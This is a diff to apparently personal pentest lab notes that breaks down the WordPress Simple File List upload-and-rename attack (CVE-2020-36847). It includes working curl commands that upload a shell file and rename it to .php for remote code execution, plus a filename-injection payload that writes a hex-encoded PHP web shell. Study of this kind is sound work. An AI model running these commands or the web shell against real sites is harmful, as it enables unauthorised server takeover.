@@ -28,5 +28,37 @@ payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b
 
 ---
 
-## **Outstanding**
+### WordPress Simple File List — upload curl breakdown
+
+```bash
+curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-upload-engine.php" \
+  -F "file=@shell.png;type=image/png" \
+  -F "eeSFL_ID=1" \
+  -F "eeSFL_FileUploadDir=/wp-content/uploads/simple-file-list/" \
+  -F "eeSFL_Timestamp=1587258885" \
+  -F "eeSFL_Token=<token>"
+```
+
+| Part | Meaning |
+|---|---|
+| `-F "file=@shell.png;type=image/png"` | Multipart upload; `@` reads the local file and `type=` sets the MIME header. |
+| `-F "eeSFL_ID=1"` | Plugin list ID; normally the first configured file list. |
+| `-F "eeSFL_FileUploadDir=..."` | Destination directory; omitting it can cause HTTP 500. |
+| `-F "eeSFL_Timestamp=1587258885"` | Static timestamp used by this vulnerable plugin version. |
+| `-F "eeSFL_Token=..."` | File-list token used for upload validation. |
+
+**Why 500 without the fields:** the upload engine directly uses the list ID, destination, timestamp, and token from the request when building and validating the upload. Missing values can produce a PHP error instead of a clean rejection.
+
+**Follow-up rename:**
+```bash
+curl -s -X POST "http://$BoxIP/wp-content/plugins/simple-file-list/ee-file-engine.php" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  -H "Referer: http://$BoxIP/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1" \
+  -d "eeSFL_ID=1&eeFileOld=shell.png&eeListFolder=/&eeFileAction=Rename|shell.php"
+# eeSecurity nonce NOT required on vulnerable 4.2.2 instances
+```
+
+The literal `|` separates the action from the new filename. Verify the `.png` returns HTTP 200 before renaming, then request the resulting `.php` file to confirm execution.
+
+#### Tags: #WordPress #SimpleFileList #FileUpload #RCE #CVE202036847 #CommandBreakdowns
 This area grows alongside the modules, currently the only entry, revisit once more file-upload-specific techniques (extension/MIME filter bypasses, polyglot files) show up in a module rather than a box writeup.
